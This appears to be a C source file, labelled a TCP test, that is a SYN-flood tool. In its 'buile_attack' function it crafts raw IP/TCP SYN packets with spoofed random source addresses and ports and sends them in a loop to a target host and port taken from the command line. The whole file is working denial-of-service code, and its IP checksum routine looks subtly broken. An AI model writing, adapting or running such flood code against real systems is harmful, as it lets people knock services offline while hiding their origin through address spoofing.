/*
 * tcp_test.c
 *
 *  Created on: 2015-8-3
 *      Author: root
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define IP_HEADER_LENGTH 20
#define TCP_HEADER_LENGTH 20
#define TCP_OPTIONS_LENGTH 16
#define PACKET_SIZE (sizeof(struct iphdr) + sizeof(struct tcphdr) + TCP_OPTIONS_LENGTH)
char pad[TCP_OPTIONS_LENGTH] = {0x02,0x04,0x05,0xb4,0x04,0x02,0x08,0x0a,0x00,0x08,0x3b,0x5a,0x00,0x00,0x00,0x00};
//tcp check used
typedef struct
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
} pseudo_header;
#define TCP_CHECK_LENGTH 48
//sizeof(pseudo_header)+sizeof(struct tcphdr)+TCP_OPTIONS_LENGTH = 12 +20 + 16 = 48bytes
unsigned char checkbuf[TCP_CHECK_LENGTH] = {0};
unsigned char* pcheckbuf;

unsigned short CheckSum(unsigned char *buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        cksum += *(unsigned short*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);
    return (unsigned short)(~cksum);
}

unsigned short in_cksum(unsigned short *addr, int len) {
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer =0;

    while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
    if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

int init_socket(int sockfd, struct sockaddr_in *target, const char *dst_addr, const char *dst_port) {
    const int flag = 1;
    target->sin_family = AF_INET;
    target->sin_port = htons(atoi(dst_port));
    if (inet_aton(dst_addr, &target->sin_addr) == 0) {
        perror("inet_aton fail\n");
        exit(-1);
    }
    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("error");
        exit(-1);
    }
    if (setsockopt(sockfd,IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag)) < 0) {
        perror("setsockopt fail \n");
        exit(-1);
    }
    return sockfd;
}

unsigned int random_ip() {
	//static unsigned char mask[4] = {1, 1, 1, 1};
	unsigned char ipinfo[4];
	ipinfo[0] = random()%0xFF;
	ipinfo[1] = random()%0xFF;
	ipinfo[2] = random()%0xFF;
	ipinfo[3] = random()%0xFF;
	unsigned int ip = ipinfo[3];
	ip = ip * 256 + ipinfo[2];
	ip = ip * 256 + ipinfo[1];
	ip = ip * 256 + ipinfo[0];
	printf("ip addr = %d.%d.%d.%d\n",ipinfo[3],ipinfo[2],ipinfo[1],ipinfo[0]);
	return ip;
}

void buile_attack(int sockfd, struct sockaddr_in *target, char *buffer, unsigned long loop) {
	int sendnum = -1;
	unsigned long i = 0L;
    struct iphdr *ip = (struct iphdr *)(buffer);
    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));
    memset(buffer, 0, PACKET_SIZE);
    char* p = buffer + sizeof(struct iphdr) + sizeof(struct tcphdr);
    memcpy(p, pad, 16);

    //IP Header
    ip->version = IPVERSION;
    ip->ihl = IP_HEADER_LENGTH/4; //how many 32bits
    ip->tos = 0;
    ip->tot_len = htons(PACKET_SIZE);
    ip->id = random();
    ip->frag_off = htons(0x4000);
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->daddr = target->sin_addr.s_addr;
    ip->check = CheckSum((unsigned char*)ip, sizeof(struct iphdr));

    //TCP header
	tcp->dest = target->sin_port;
	tcp->window = htons(0x2000);
	tcp->seq = random();
	tcp->ack = 0;
	tcp->doff = (TCP_HEADER_LENGTH + TCP_OPTIONS_LENGTH)/4; //=36/4
	tcp->syn = 1;

	pseudo_header tcpheader;
	tcpheader.dest_address = ip->daddr;
	tcpheader.placeholder = 0;
	tcpheader.protocol = ip->protocol;
	tcpheader.tcp_length = htons(36); //sizeof(struct tcphdr) + TCP_OPTIONS_LENGTH

	for(i = 1;i != loop;i++) {
		unsigned short srcport = random()%65535;
		tcp->source = htons(srcport);
		tcp->check = 0;
		ip->saddr = random_ip();//inet_addr("172.31.28.187");//random();//inet_addr(src_addr); //random();
		tcpheader.source_address = ip->saddr;
		memset(checkbuf, 0, TCP_CHECK_LENGTH);
		memcpy(checkbuf, &tcpheader, sizeof(tcpheader));
		pcheckbuf = checkbuf + sizeof(tcpheader);
		memcpy(pcheckbuf, tcp, sizeof(struct tcphdr));
		pcheckbuf += sizeof(struct tcphdr);
		memcpy(pcheckbuf, pad, 16);

		tcp->check = in_cksum((unsigned short *)checkbuf, 48);
		sendnum = sendto(sockfd, buffer, PACKET_SIZE, 0,(struct sockaddr *)target, sizeof(struct sockaddr_in));
		printf("sendto = %d\n",sendnum);
	}
}

int main(int argc, const char *argv[])
{
	unsigned long loop = 0;
    char *buffer;
    char *buffer_head = NULL;
    int sockfd = 0;

    struct sockaddr_in *target;
    if (argc < 3) {
        printf("usage: destination address, destination port, test number \n");
        exit(-1);
    }
    const char *dst_addr = argv[1];
    const char *dst_port = argv[2];
    if(argc >= 4) {
    	loop = atol(argv[3]);
    }
    target = calloc(sizeof(struct sockaddr_in),1);
    buffer = calloc(PACKET_SIZE, 1);

    sockfd = init_socket(sockfd, target, dst_addr, dst_port);
    buile_attack(sockfd, target, buffer, loop);

    free(buffer_head);
    free(target);

    return 0;
}
